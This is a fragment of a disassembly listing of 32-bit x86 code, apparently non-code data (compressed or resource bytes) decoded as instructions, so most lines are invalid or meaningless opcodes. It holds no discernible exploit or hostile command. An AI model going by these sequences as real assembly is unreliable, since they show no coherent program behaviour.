  4203a5:	and    ah,bh
  4203a7:	jg     0x420367
  4203a9:	add    BYTE PTR [eax],al
  4203ab:	lahf   
  4203ac:	pop    esi
  4203ad:	xor    BYTE PTR [edx+0x67],0xb2
  4203b1:	(bad)  
  4203b2:	scas   eax,DWORD PTR es:[edi]
  4203b3:	retf   
  4203b4:	out    0xfa,al
  4203b6:	push   ds
  4203b7:	aam    0xa5
  4203b9:	xor    BYTE PTR [ecx+0x57bd2d27],dh
  4203bf:	push   eax
  4203c0:	(bad)  
  4203c1:	push   esp
  4203c2:	push   ebx
  4203c3:	int    0xf2
  4203c5:	cmp    esi,esi
  4203c7:	push   esp
  4203c8:	add    BYTE PTR [eax],al
  4203ca:	mov    edx,0x50ce
  4203cf:	pushf  
  4203d0:	sahf   
  4203d1:	mov    DWORD PTR [eax],0xed1c4700
  4203d7:	sbb    al,0xbc
  4203d9:	ja     0x4203cf
  4203db:	adc    DWORD PTR [ebp+0x363ac94a],edi
  4203e1:	sti    
  4203e2:	push   0x53ef374a
  4203e7:	outs   dx,DWORD PTR cs:[esi]
  4203e9:	jb     0x42044e
  4203eb:	arpl   WORD PTR [edx],cx
  4203ed:	and    BYTE PTR [ebx+0x62],dh
  4203f0:	jne    0x420464
  4203f2:	and    BYTE PTR gs:[ebx],ah
  4203f5:	and    BYTE PTR [edx+eiz*2+0x6f],al
  4203f9:	jae    0x420471
  4203fb:	imul   esp,DWORD PTR gs:[ebp+0x47],0x576e0d2e
  420403:	js     0x420425
  420405:	or     bh,BYTE PTR [edx]
  420407:	and    BYTE PTR [ebx+0x3e],ah
  42040a:	outs   dx,BYTE PTR ds:[esi]
  42040b:	bound  ebp,QWORD PTR gs:[edi+0xa]
  42040f:	outs   dx,DWORD PTR cs:[esi]
  420411:	inc    esp
  420412:	jb     0x42047a
  420414:	gs das 
  420416:	push   esp
  420417:	outs   dx,BYTE PTR ds:[esi]
  420418:	ja     0x420424
  42041a:	data16 cmp ch,BYTE PTR [ecx+0x65]
  42041e:	gs jo  0x420441
  420421:	arpl   WORD PTR [esi-0x5618edc8],ax
  420427:	push   esi
  420428:	add    BYTE PTR [eax],al
  42042a:	add    BYTE PTR [ebp-0x44],ch
  42042d:	add    BYTE PTR [eax],al
  42042f:	imul   ebx,ebx,0x0
  420432:	add    BYTE PTR [eax],al
  420434:	jne    0x4204ab
  420436:	jne    0x4204ad
  420438:	jne    0x4204af
  42043a:	jne    0x4204b1
  42043c:	jne    0x420409
  42043e:	je     0x42049f
  420440:	out    0x4a,eax
  420442:	inc    eax
  420443:	mov    esp,0x5b7d1e37
  420448:	dec    ebx
  420449:	jecxz  0x4204bf
  42044b:	out    0x18,al
  42044d:	cmp    eax,0xe3c326b9
  420452:	push   cs
  420453:	mov    ?,eax
	...
  42045d:	add    BYTE PTR [eax],al
  42045f:	add    BYTE PTR [ebp+0x19],al
  420462:	or     al,0x3
  420464:	add    BYTE PTR [eax],al
  420466:	jbe    0x42046f
  420468:	loope  0x420433
  42046a:	hlt    
  42046b:	fisttp WORD PTR [edx-0x763f7fdb]
  420471:	xor    eax,0x9c84c4c9
  420476:	sub    al,BYTE PTR [ebp-0x52]
  420479:	mov    ebp,0xb123707f
  42047e:	mov    cl,BYTE PTR [ecx-0x3]
  420481:	xor    esi,DWORD PTR [eax+0x7d]
  420484:	xchg   esi,eax
  420485:	inc    eax
  420486:	or     esi,DWORD PTR [ecx+0xc000074]
  42048c:	adc    eax,0x3b8d0000
  420491:	sbb    al,BYTE PTR [eax]
  420493:	add    BYTE PTR [edi+edi*1],bl
  420496:	mov    bl,0xe1
  420498:	adc    bh,0x49
  42049b:	inc    BYTE PTR [ecx-0xb3668c]
  4204a1:	cmp    cl,BYTE PTR ds:0x8c45f583
  4204a7:	ss push es
  4204a9:	jae    0x420435
  4204ab:	pop    ebp
  4204ac:	add    BYTE PTR [eax],al
  4204ae:	add    BYTE PTR [ecx+ebx*2],bl
  4204b1:	push   ebx
  4204b2:	mov    BYTE PTR [ecx],dh
  4204b4:	in     al,dx
  4204b5:	lahf   
  4204b6:	mov    esi,0x7f0768aa
  4204bb:	out    dx,al
  4204bc:	nop
  4204bd:	mov    edi,0xf21e6656
  4204c2:	lods   eax,DWORD PTR ds:[esi]
  4204c3:	pop    es
  4204c4:	repz ds jae 0x4204d0
  4204c8:	pop    ss
  4204c9:	push   edx
  4204ca:	and    esi,DWORD PTR [ebp+0x0]
  4204cd:	add    BYTE PTR [ecx],dl
  4204cf:	cmp    eax,0x37
  4204d4:	test   DWORD PTR [ebp-0x7a7a7a7b],eax
  4204da:	test   DWORD PTR [ebp-0x5b8797b],eax
  4204e0:	(bad)  
  4204e1:	(bad)  
  4204e2:	(bad)  
  4204e3:	(bad)  
  4204e4:	(bad)  
  4204e5:	(bad)  
  4204e6:	(bad)  
  4204e7:	(bad)  
  4204e8:	push   DWORD PTR [ebp+0x75]
  4204eb:	scas   al,BYTE PTR es:[edi]
  4204ec:	lods   eax,DWORD PTR ds:[esi]
  4204ed:	xchg   BYTE PTR [ecx-0x421a8b43],ah
  4204f3:	fimul  DWORD PTR [edx+ebx*2+0x41]
  4204f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4204f8:	xlat   BYTE PTR ds:[ebx]
  4204f9:	imul   ebx,DWORD PTR ds:0x50381072,0x1df309b1
  420503:	jne    0x42057a
  420505:	push   es
  420506:	mov    bl,0x75
  420508:	jne    0x420501
  42050a:	dec    edx
  42050b:	jne    0x420582
  42050d:	push   ebp
  42050e:	mov    edi,0xdb9006ac
  420513:	(bad)  
  420514:	xor    ecx,DWORD PTR [eax-0x75]
  420517:	xchg   esi,eax
  420518:	and    ecx,ebp
  42051a:	inc    ecx
  42051b:	jo     0x42059c
  42051d:	call   0xeead:0x36b2f64d
  420524:	push   es
  420525:	jne    0x42055a
  420527:	push   ecx
  420528:	(bad)  
  420529:	mov    bh,0x4a
  42052b:	xor    esi,DWORD PTR [ebx]
  42052d:	xor    ebp,DWORD PTR [ebx]
  42052f:	push   eax
  420530:	mov    BYTE PTR [edx],dl
  420532:	outs   dx,DWORD PTR ds:[esi]
  420533:	cdq    
  420534:	scas   al,BYTE PTR es:[edi]
  420535:	rol    BYTE PTR [eax],1
  420537:	lahf   
  420538:	mov    esi,0x1374ef45
  42053d:	fs retf 
  42053f:	inc    ecx
  420540:	jecxz  0x42053e
  420542:	mov    BYTE PTR [eax],dl
  420544:	mov    ebp,DWORD PTR [edi]
  420546:	push   edx
  420547:	push   DWORD PTR [edi+ebx*4+0x20d90842]
  42054e:	pop    es
  42054f:	imul   ebp,DWORD PTR [edi+0x33],0x33712633
  420556:	xor    esi,DWORD PTR [ebx]
  420558:	add    DWORD PTR [ebx-0x7c7c7c7d],0xffffff83
  42055f:	add    DWORD PTR [ebx-0x175c2387],0xffffffe8
  420566:	call   0xe92aee53
  42056b:	call   0xe7420658
  420570:	mov    eax,ds:0x89ad6cb2
  420575:	xlat   BYTE PTR ds:[ebx]
  420576:	sbb    edi,DWORD PTR [ecx+0x8]
  420579:	ret    0x60df
  42057c:	call   0xb496932b
  420581:	mov    edi,0xc3620338
  420586:	sub    eax,DWORD PTR [eax]
  420588:	add    BYTE PTR [edi+ecx*1+0x59c39601],ch
  42058f:	std    
  420590:	xor    BYTE PTR [edx+0x61],bh
  420593:	adc    al,0xa2
  420595:	jecxz  0x420608
  420597:	sub    bh,ah
  420599:	mov    ah,0x40
  42059b:	imul   esi,DWORD PTR [ebx+0x18906255],0x44d3e5cf
  4205a5:	adc    eax,0x59320000
  4205aa:	xchg   edi,eax
  4205ab:	add    BYTE PTR [eax],al
  4205ad:	dec    edx
  4205ae:	sub    al,bh
  4205b0:	add    bh,bh
  4205b2:	inc    ebx
  4205b3:	in     eax,0xda
  4205b5:	test   eax,0xc97cd565
  4205ba:	jmp    0x2ec91cd2
  4205bf:	cmp    al,0xf
  4205c1:	or     eax,0x5089e773
  4205c6:	daa    
  4205c7:	adc    ebx,DWORD PTR [ebp+0x35]
  4205ca:	(bad)  
  4205cb:	(bad)  
  4205cc:	jmp    ebp
  4205ce:	push   ecx
  4205cf:	jmp    DWORD PTR [edx]
  4205d1:	ins    BYTE PTR es:[edi],dx
  4205d2:	jb     0x4205f4
  4205d4:	cs jb  0x42062e
  4205d7:	and    ah,BYTE PTR [eax]
  4205d9:	and    BYTE PTR [esi+esi*2+0xd],dh
  4205dd:	outs   dx,DWORD PTR ds:[esi]
  4205de:	push   edx
  4205df:	and    BYTE PTR [eax],ah
  4205e1:	gs ins DWORD PTR es:[edi],dx
  4205e3:	push   edi
  4205e4:	gs gs outs dx,BYTE PTR ds:[esi]
  4205e8:	and    BYTE PTR [eax],ah
  4205ea:	and    BYTE PTR [ebx+0x4d],dh
  4205ed:	imul   esp,DWORD PTR [edx+0x61],0x6362694d
  4205f4:	ins    DWORD PTR es:[edi],dx
  4205f5:	and    BYTE PTR [eax],ah
  4205f7:	bound  esp,QWORD PTR [ecx+0x69]
  4205fa:	ins    DWORD PTR es:[edi],dx
  4205fb:	and    BYTE PTR cs:[ecx+0x64],ch
  4205ff:	outs   dx,BYTE PTR ds:[esi]
  420600:	fs je  0x420668
  420603:	cmp    al,0x73
  420605:	outs   dx,BYTE PTR ds:[esi]
  420606:	outs   dx,BYTE PTR ds:[esi]
  420607:	cmp    al,0x20
  420609:	das    
  42060a:	and    BYTE PTR ds:0x722e7320,cl
  420610:	jae    0x420677
  420612:	outs   dx,BYTE PTR ds:[esi]
  420613:	push   0x736f7222
  420618:	jne    0x42068d
  42061a:	ins    DWORD PTR es:[edi],dx
  42061b:	sub    DWORD PTR gs:[edx+0x63],esp
  42061f:	bound  esp,QWORD PTR ds:[ebp+0x74]
  420623:	push   ebx
  420624:	xor    ah,BYTE PTR [eax]
  420626:	gs jns 0x420680
  420629:	ins    DWORD PTR es:[edi],dx
  42062a:	bound  esp,QWORD PTR gs:[eax]
  42062d:	or     eax,0xcaff7641
  420632:	fdiv   st(7),st
  420634:	(bad)  
  420635:	inc    DWORD PTR [ebp-0x7a7a7a7b]
  42063b:	test   DWORD PTR [ebp+0x6c028585],eax
  420641:	xchg   esp,eax
  420642:	push   eax
  420643:	xlat   BYTE PTR ds:[ebx]
  420644:	mov    WORD PTR [ebp+0x70],?
  420647:	daa    
  420648:	push   ds
  420649:	dec    esi
  42064a:	cmp    DWORD PTR [edi+0x3c],ebx
  42064d:	dec    edx
  42064e:	or     esi,esi
  420650:	push   cs
  420651:	sbb    ebp,DWORD PTR [esi]
  420653:	and    BYTE PTR [ebp+0x747418fc],ch
  420659:	je     0x4206cf
  42065b:	je     0x4206d1
  42065d:	je     0x4206d3
  42065f:	je     0x4206a6
  420661:	inc    ebp
  420662:	mov    ebx,0x45112d89
  420667:	inc    ebp
  420668:	sbb    DWORD PTR [ecx+edi*4+0x2a],esp
  42066c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42066d:	mov    esi,eax
  42066f:	xor    al,0x1b
  420671:	sub    BYTE PTR [ebx+0x11],dl
  420674:	aas    
  420675:	mov    bh,0xcf
  420677:	mov    ds:0x9e781436,al
  42067c:	(bad)  [edx+0x313d3581]
  420682:	xchg   esi,eax
  420683:	push   eax
  420684:	mov    bl,0x11
  420686:	popf   
  420687:	mov    cl,0x83
  420689:	dec    esi
  42068a:	mov    ch,0x45
  42068c:	inc    ebp
  42068d:	mov    ds:0x4d45450b,eax
  420692:	dec    esi
  420693:	add    al,0x45
  420695:	add    BYTE PTR [ebp-0x77],dh
  420698:	das    
  420699:	or     al,0xd2
  42069b:	inc    ebp
  42069c:	or     esi,esi
  42069e:	fnstsw WORD PTR [edi+0x32c69181]
  4206a4:	in     eax,dx
  4206a5:	lods   al,BYTE PTR ds:[esi]
  4206a6:	inc    esi
  4206a7:	pusha  
  4206a8:	inc    DWORD PTR [edx]
  4206aa:	cwde   
  4206ab:	int3   
  4206ac:	xor    al,0x67
  4206ae:	add    BYTE PTR [eax],al
  4206b0:	add    BYTE PTR [esi+0x611479bb],bl
  4206b6:	add    eax,0xdac74014
  4206bb:	mov    esp,0x529754eb
  4206c0:	bound  esi,QWORD PTR ds:0xeb7db2c9
  4206c6:	mov    ch,0x6e
  4206c8:	mov    esp,0x88155a36
  4206cd:	pop    ss
  4206ce:	add    BYTE PTR [eax],al
  4206d0:	push   ss
  4206d1:	iret   
  4206d2:	xor    BYTE PTR [eax],al
  4206d4:	add    BYTE PTR [eax],al
  4206d6:	(bad)  
  4206d7:	(bad)  
  4206d8:	(bad)  
  4206d9:	(bad)  
  4206da:	(bad)  
  4206db:	(bad)  
  4206dc:	(bad)  
  4206dd:	(bad)  
  4206de:	jmp    FWORD PTR [ebx-0x74743eb8]
  4206e4:	mov    ecx,DWORD PTR [ebx-0x74747475]
  4206ea:	mov    ecx,DWORD PTR [ebx-0x2ca2c075]
  4206f0:	adc    dl,BYTE PTR [ebp+0x5f2e54ff]
  4206f6:	retf   0xfc6
  4206f9:	inc    esp
  4206fa:	fnsetpm(287 only) 
  4206fc:	xchg   esp,eax
  4206fd:	mov    ebp,0x7145ef72
  420702:	and    esi,DWORD PTR [edi]
  420704:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420705:	mov    ecx,DWORD PTR [ebx-0x7474621b]
  42070b:	dec    esp
  42070c:	xor    ecx,DWORD PTR [ebx-0x2ab24475]
  420712:	in     eax,0xb6
  420714:	out    dx,al
  420715:	sbb    eax,0x237497f2
  42071a:	(bad)  
  42071b:	and    edx,DWORD PTR [edi]
  42071d:	enter  0xa113,0x99
  420721:	fdiv   st(0),st
  420723:	jmp    0x4206c6
  420725:	out    0x24,al
  420727:	mov    ecx,DWORD PTR [edi]
  420729:	mov    bh,0xd7
  42072b:	xchg   ebx,eax
  42072c:	push   eax
  42072d:	(bad)  
  42072e:	(bad)  
  42072f:	bswap  eax
  420731:	xchg   BYTE PTR ds:0x75916026,cl
  420737:	cld    
  420738:	mov    cs,eax
  42073a:	mov    dh,0x42
  42073c:	mov    bl,0xa3
  42073e:	hlt    
  42073f:	pop    ecx
  420740:	pop    ecx
  420741:	add    al,0x13
  420743:	fild   QWORD PTR [ecx]
  420745:	mov    ebx,0x55433f06
  42074a:	aad    0xe7
  42074c:	lock or al,0x8b
  42074f:	and    al,0x0
  420751:	inc    esp
  420752:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420753:	(bad)  
  420754:	cmovp  ebx,DWORD PTR [esi+0xf0f0f]
	...
  420763:	mov    dl,0x3b
  420765:	jg     0x4206ec
  420767:	test   DWORD PTR [ebp-0x7a7a7a7b],eax
  42076d:	test   DWORD PTR [ebp-0x36ac0000],eax
  420773:	and    ah,BYTE PTR [edx]
  420775:	cmp    BYTE PTR [ebx],bl
  420777:	aaa    
  420778:	pop    eax
  420779:	add    ebp,ecx
  42077b:	pop    esp
  42077c:	mov    ch,0x64
  42077e:	fld    QWORD PTR [edi]
  420780:	cmp    al,0x83
  420782:	mov    bh,0xbc
  420784:	ret    
  420785:	call   0x6aded1
  42078a:	add    BYTE PTR [ecx+0x3b],bl
  42078d:	mov    ds:0xd8e09834,eax
  420792:	add    BYTE PTR [ebx-0x6e],bl
  420795:	mov    ds:0x39ba909f,eax
  42079a:	push   DWORD PTR [eax-0x1edd3ad5]
  4207a0:	mov    esi,0x7b373f7b
  4207a5:	in     al,dx
  4207a6:	add    edx,edi
  4207a8:	add    BYTE PTR [eax],al
  4207aa:	add    DWORD PTR [ebp-0x27],edi
  4207ad:	add    BYTE PTR [eax],al
  4207af:	repz test DWORD PTR [ebx],ecx
  4207b2:	add    BYTE PTR [ebp+0x6a8c47ec],cl
  4207b8:	aam    0x81
  4207ba:	mov    es,ebp
  4207bc:	dec    esp
  4207bd:	xor    bl,bh
  4207bf:	adc    al,0x3e
  4207c1:	jmp    0xc0c85141
  4207c6:	sbb    BYTE PTR [ebx-0x13f8a67c],0x8d
  4207cd:	lea    ecx,[ebp-0x72724446]
  4207d3:	das    
  4207d4:	into   
  4207d5:	lea    ecx,[ebp-0x7c7c7c73]
  4207db:	add    DWORD PTR [ebx-0x7c7c7c7d],0xffffffad
  4207e2:	sub    dl,bh
  4207e4:	jnp    0x4207ee
  4207e6:	stos   DWORD PTR es:[edi],eax
  4207e7:	outs   dx,BYTE PTR ds:[esi]
  4207e8:	jmp    edi
  4207ea:	cmc    
  4207eb:	leave  
  4207ec:	dec    eax
  4207ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4207ee:	push   0xffffffc1
  4207f0:	das    
  4207f1:	adc    al,0x4
  4207f3:	call   0x491e917
  4207f8:	iret   
	...
  420801:	add    BYTE PTR [eax],al
  420803:	add    BYTE PTR [eax],cl
  420805:	leave  
  420806:	jmp    0x4207d1
  420808:	add    BYTE PTR [eax],al
  42080a:	pop    edx
  42080b:	lea    ebx,[ebx+esi*1-0x72]
  42080f:	pop    edi
  420810:	pop    eax
  420811:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420812:	mov    ch,0x3f
  420814:	inc    esp
  420815:	mov    WORD PTR [edi+0x33487d1b],?
  42081b:	or     bl,bh
  42081d:	dec    ebx
  42081e:	dec    esp
  42081f:	inc    edi
  420820:	fld    TBYTE PTR [edi+0x21]
  420823:	loopne 0x4207ec
  420825:	sub    al,bh
  420827:	js     0x420837
  420829:	test   BYTE PTR [edx+0xd9c9],dl
  42082f:	sub    ah,BYTE PTR ds:0x9c720000
  420835:	add    BYTE PTR cs:[eax],al
  420838:	add    al,0x6a
  42083a:	pushf  
  42083b:	out    0x72,al
  42083d:	mov    edx,0x5c0ae4c8
  420842:	fs mov cl,0x84
  420845:	push   ebx
  420846:	jnp    0x420841
  420848:	mov    ds:0xda3ad7d4,al
  42084d:	push   ebx
  42084e:	mov    dl,0x3b
  420850:	add    BYTE PTR [eax],al
  420852:	add    BYTE PTR [esi-0xd07615],ch
  420858:	int3   
  420859:	pop    ds
  42085a:	lahf   
  42085b:	push   ss
  42085c:	fs jg  0x420887
  42085f:	jbe    0x4208ce
  420861:	mov    BYTE PTR [edx-0x49b7b1ae],0x6b
  420868:	fst    DWORD PTR [edx]
  42086a:	not    DWORD PTR [edx-0x80]
  42086d:	in     eax,dx
  42086e:	adc    eax,0xe500007e
  420873:	(bad)  
  420874:	retf   
	...
  420881:	or     BYTE PTR [eax+0x333333b8],cl
  420887:	xor    esi,DWORD PTR [ebx]
  420889:	xor    esi,DWORD PTR [ebx]
  42088b:	xor    esi,DWORD PTR [ebx]
  42088d:	mov    ecx,DWORD PTR [ebx-0x21a509d9]
  420893:	xor    BYTE PTR [eax],0x60
  420896:	shl    BYTE PTR [edi-0x2d81298],0x4c
  42089d:	cdq    
  42089e:	lods   eax,DWORD PTR ds:[esi]
  42089f:	test   BYTE PTR [eax-0x35],bl
  4208a2:	sbb    dh,bh
  4208a4:	lea    ebp,[esp+edx*1+0x65af8b8b]
  4208ab:	mov    ecx,DWORD PTR [ebx-0x747458ee]
  4208b1:	lahf   
  4208b2:	mov    dl,0xd0
  4208b4:	mov    ds:0x2e4f2a04,al
  4208b9:	fs push ss
  4208bb:	sbb    DWORD PTR [eax],eax
  4208bd:	xor    bl,BYTE PTR [edx+0x5c]
  4208c0:	xor    DWORD PTR [eax-0x51],edx
  4208c3:	push   ecx
  4208c4:	stos   BYTE PTR es:[edi],al
  4208c5:	stos   DWORD PTR es:[edi],eax
  4208c6:	mov    edi,0xf8b86b2
  4208cb:	fistp  DWORD PTR [edx]
  4208cd:	cmc    
  4208ce:	ror    DWORD PTR [edi],cl
  4208d0:	(bad)  
  4208d1:	pcmpgtd mm1,QWORD PTR [esi]
  4208d4:	jmp    0x24c:0x6ae0fba0
  4208db:	cmp    al,0xfb
  4208dd:	call   0x1df43b18
  4208e2:	outs   dx,BYTE PTR ds:[esi]
  4208e3:	push   edi
  4208e4:	aaa    
  4208e5:	and    DWORD PTR [ebx],esi
  4208e7:	xchg   edi,eax
  4208e8:	lock xchg ebx,eax
  4208ea:	mov    WORD PTR [ebx-0x1e],fs
  4208ed:	push   esi
  4208ee:	jl     0x4208f4
  4208f0:	dec    edi
  4208f1:	enter  0xb559,0xfa
  4208f5:	punpckhwd mm2,QWORD PTR [ebx+0x74]
  4208f9:	outs   dx,BYTE PTR ds:[esi]
  4208fa:	je     0x42096f
  4208fc:	and    BYTE PTR cs:[edx+0x6f],ah
  420900:	outs   dx,DWORD PTR gs:[esi]
  420902:	popa   
  420903:	jbe    0x42096e
  420905:	imul   ebp,DWORD PTR [edi+0x61],0x53283e76
  42090c:	jo     0x42092e
  42090e:	gs ins DWORD PTR es:[edi],dx
  420910:	or     eax,0x65656967
  420915:	outs   dx,DWORD PTR ds:[esi]
  420916:	addr16 jbe 0x420956
  420919:	jo     0x420980
  42091b:	fs jae 0x420990
  42091e:	ins    DWORD PTR es:[edi],dx
  42091f:	js     0x42098a
  420921:	gs outs dx,BYTE PTR cs:[esi]
  420924:	das    
  420925:	jae    0x420931
  420927:	bound  ebp,QWORD PTR gs:[edi+0x6f]
  42092b:	imul   esp,DWORD PTR [ebp+0x63],0x4d776564
  420932:	outs   dx,DWORD PTR ds:[esi]
  420933:	gs push eax
  420935:	gs jae 0x42099e
  420938:	and    BYTE PTR [esi+0x2f],ch
  42093b:	outs   dx,BYTE PTR ds:[esi]
  42093d:	jae    0x42095f
  42093f:	and    BYTE PTR [eax],ah
  420941:	jb     0x4209b0
  420943:	jne    0x4209a8
  420945:	and    BYTE PTR [ebx+0x73],dh
  420948:	jae    0x4209b7
  42094a:	imul   edx,DWORD PTR [edx+0x65],0x746d6e4d
  420951:	imul   esp,DWORD PTR [edi+0x22],0x72656562
  420958:	outs   dx,DWORD PTR ds:[esi]
  420959:	push   ebx
  42095a:	bound  ebp,QWORD PTR ds:[edi+0x44]
  42095e:	or     ch,BYTE PTR [ebp+0x6e]
  420961:	ins    DWORD PTR es:[edi],dx
  420962:	and    BYTE PTR [edi+0x20],ah
  420965:	ins    DWORD PTR es:[edi],dx
  420966:	arpl   WORD PTR gs:0x2f723e74,cx
  42096d:	imul   ecx,DWORD PTR [edi],0xf0f51c1
  420973:	xadd   al,al
  420976:	rol    al,0xc0
  420979:	rol    al,0xc0
  42097c:	shr    BYTE PTR [esi],0xed
  42097f:	pop    ebp
  420980:	mov    ecx,DWORD PTR [ebx-0x74747475]
  420986:	mov    ecx,DWORD PTR [ebx-0x77a7a75]
  42098c:	clc    
  42098d:	aam    0x26
  42098f:	stos   DWORD PTR es:[edi],eax
  420990:	(bad)  
  420991:	popf   
  420992:	ins    DWORD PTR es:[edi],dx
  420993:	(bad)  
  420994:	je     0x420981
  420996:	psubsb mm3,QWORD PTR [edx-0x27]
  42099a:	fild   WORD PTR [edi]
  42099c:	pop    ebx
  42099d:	fiadd  DWORD PTR [esi+0x7b10c04a]
  4209a3:	test   DWORD PTR [ebp-0x56dda4c9],eax
  4209a9:	mov    dh,0xcc
  4209ab:	jnp    0x4209f2
  4209ad:	(bad)  
  4209ae:	pop    esi
  4209af:	jbe    0x4209f8
  4209b1:	popf   
  4209b2:	jecxz  0x42099a
  4209b4:	(bad)  
  4209b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4209b6:	add    DWORD PTR [esi+ecx*1+0x7a],edi
  4209ba:	(bad)  [esp+eax*4+0x158fbc53]
  4209c1:	add    al,BYTE PTR [ebp-0x24a7ee7b]
  4209c7:	test   DWORD PTR [ebp-0x7ab6d060],eax
  4209cd:	int3   
  4209ce:	cdq    
  4209cf:	test   BYTE PTR [eax],ch
  4209d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4209d2:	call   0x2db3:0x5951aad0
  4209d9:	push   0xffffffe8
  4209db:	push   cs
  4209dc:	stos   BYTE PTR es:[edi],al
  4209dd:	push   ebp
  4209de:	mov    dh,0x50
  4209e0:	jmp    0x420989
  4209e2:	fwait
  4209e3:	pop    edi
  4209e4:	xchg   esi,eax
  4209e5:	push   ss
  4209e6:	int3   
  4209e7:	int3   
  4209e8:	int3   
  4209e9:	adc    BYTE PTR [ecx-0x34],dl
  4209ec:	int3   
  4209ed:	adc    cl,BYTE PTR [edi+0xcccccc]
	...
  4209fb:	dec    ebp
  4209fc:	(bad)  
  4209fe:	call   0xcbf398f5
  420a03:	jp     0x420992
  420a05:	mov    ecx,0x4c41b119
  420a0a:	or     esi,ebx
  420a0c:	arpl   WORD PTR [eax-0x1fa0ad6e],bp
  420a12:	call   0x89cb93a0
  420a17:	mov    DWORD PTR [ecx+0x898989],ecx
  420a1d:	add    BYTE PTR [ecx-0x67],dh
  420a20:	jns    0x56b20a26
  420a26:	and    al,0x98
  420a28:	adc    ch,BYTE PTR [ebp-0x28]
  420a2b:	dec    ebx
  420a2c:	or     DWORD PTR [ebp-0x61fce682],0x3e
  420a33:	mov    bl,0x6b
  420a35:	and    BYTE PTR [ebx+0x32],ah
  420a38:	fist   DWORD PTR [eax+0x768be820]
  420a3e:	ins    DWORD PTR es:[edi],dx
  420a3f:	rcl    BYTE PTR [ecx+esi*4-0x8],0x32
  420a44:	rol    DWORD PTR [edi-0x6effffea],1
  420a4a:	xor    DWORD PTR [eax],eax
  420a4c:	add    BYTE PTR [ebp+0xd36c],ch
  420a52:	pop    edx
  420a53:	mov    DWORD PTR [ebx+0x12],ebp
  420a56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a57:	push   esp
  420a58:	cmp    DWORD PTR [esi+0x30fcdc9b],ebx
  420a5e:	jp     0x420ac4
  420a60:	retf   0x8551
  420a63:	and    al,0x5d
  420a65:	std    
  420a66:	jno    0x420ac3
  420a68:	mov    bh,0x43
  420a6a:	add    BYTE PTR [eax],al
  420a6c:	add    BYTE PTR [ecx],dh
  420a6e:	dec    ebx
  420a6f:	imul   edx,edi,0x2
  420a72:	pop    esp
  420a73:	test   BYTE PTR [edx-0x5a44de99],bl
  420a79:	push   ds
  420a7a:	cmp    DWORD PTR [ecx+0x2fdbbad7],0xffffffa7
  420a81:	or     bl,cl
  420a83:	jp     0x420a62
  420a85:	push   cs
  420a86:	inc    edi
  420a87:	ret    0x7ea0
  420a8a:	add    BYTE PTR [eax],al
  420a8c:	adc    BYTE PTR [edi-0x67],0x0
  420a90:	add    BYTE PTR [eax],al
  420a92:	mov    ecx,DWORD PTR [ebx-0x74747475]
  420a98:	mov    ecx,DWORD PTR [ebx-0x759bba75]
	...
  420aa6:	add    BYTE PTR [ebp+0x45],al
  420aa9:	(bad)  
  420aaa:	and    esi,DWORD PTR [esi]
  420aac:	cdq    
  420aad:	inc    ecx
  420aae:	mov    ebx,0xc70539e
  420ab3:	xor    BYTE PTR [ecx-0x19b54b40],0xc9
  420aba:	jb     0x420b22
  420abc:	mov    bh,0x75
  420abe:	out    dx,eax
  420abf:	cmp    BYTE PTR [eax+0x45],al
  420ac2:	inc    ebp
  420ac3:	std    
  420ac4:	imul   eax,DWORD PTR [ebp+0x45],0xffffff8f
  420ac8:	mov    cl,0x45
  420aca:	inc    ebp
  420acb:	sub    eax,0xcd980752
  420ad0:	push   ss
  420ad1:	dec    edx
  420ad2:	mov    dh,ch
  420ad4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ad5:	sbb    BYTE PTR [ebx],bl
  420ad7:	xor    ecx,DWORD PTR [edi+eax*2]
  420ada:	dec    ebp
  420adb:	out    dx,eax
  420adc:	popf   
  420add:	repz arpl WORD PTR [ecx],si
  420ae0:	cwde   
  420ae1:	sti    
  420ae2:	rol    DWORD PTR [ebp+0x0],cl
  420ae5:	xchg   DWORD PTR [esi+0x1986],esi
  420aeb:	add    BYTE PTR [ebx+0x76],bl
  420aee:	inc    edx
  420aef:	sub    BYTE PTR [esi-0x17],bh
  420af2:	cmp    eax,0x66b55126
  420af7:	sub    BYTE PTR [esi+0x5b62dd2f],al
  420afd:	out    dx,eax
  420afe:	(bad)  
  420b00:	ret    0xd3af
  420b03:	jp     0x420a8b
  420b05:	sub    al,0x7d
  420b07:	jmp    0x3ac160c
  420b0c:	cdq    
  420b0d:	xchg   ebp,eax
  420b0e:	or     al,BYTE PTR [eax]
  420b10:	add    BYTE PTR [ebp+0x6c],cl
  420b13:	add    BYTE PTR [eax],al
  420b15:	add    bh,bh
  420b17:	(bad)  
  420b18:	(bad)  
  420b19:	(bad)  
  420b1a:	(bad)  
  420b1b:	(bad)  
  420b1c:	(bad)  
  420b1d:	(bad)  
  420b1e:	push   DWORD PTR [esi-0x747448df]
  420b24:	mov    ecx,DWORD PTR [ebx-0x74747475]
  420b2a:	mov    ecx,DWORD PTR [esp+ecx*1]
  420b2d:	popa   
  420b2e:	out    0x7a,al
  420b30:	cmp    edi,DWORD PTR [ebp+0x7]
  420b33:	cmp    al,0x9f
  420b35:	call   0x4bb372c0
  420b3a:	test   al,0x90
  420b3c:	(bad)  
  420b3d:	dec    BYTE PTR [ebx]
  420b3f:	aaa    
  420b40:	add    eax,0xee90840a
  420b45:	or     al,0xc
  420b47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b49:	jg     0x420b08
  420b4b:	jl     0x420b66
  420b4d:	adc    eax,0xa564262b
  420b52:	xor    esi,DWORD PTR [ebp+0xb04310b]
  420b58:	lock cmp DWORD PTR [ebp+0x30],edi
  420b5c:	addr16 push ecx
  420b5e:	int3   
  420b5f:	dec    edx
  420b60:	js     0x420b2f
  420b62:	cld    
  420b63:	cmp    ecx,DWORD PTR [esp+ecx*1]
  420b66:	mov    ebx,0xc0c1c6d
  420b6b:	iret   
  420b6c:	sbb    DWORD PTR [esi+0xc],esi
  420b6f:	je     0x420b1c
  420b71:	xor    esi,DWORD PTR [edx-0x4b]
